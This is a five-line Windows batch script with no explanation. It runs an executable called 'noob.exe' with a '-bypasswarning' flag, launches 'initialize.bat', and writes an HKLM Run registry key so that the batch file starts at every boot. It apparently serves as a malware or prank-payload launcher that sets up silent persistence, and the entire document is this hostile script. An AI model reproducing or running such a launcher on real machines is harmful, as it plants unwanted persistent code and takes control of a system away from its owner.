@echo off
cd res
noob.exe -bypasswarning
start initialize.bat
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "initializer" /t REG_SZ /F /D "%cd%\initialize.bat"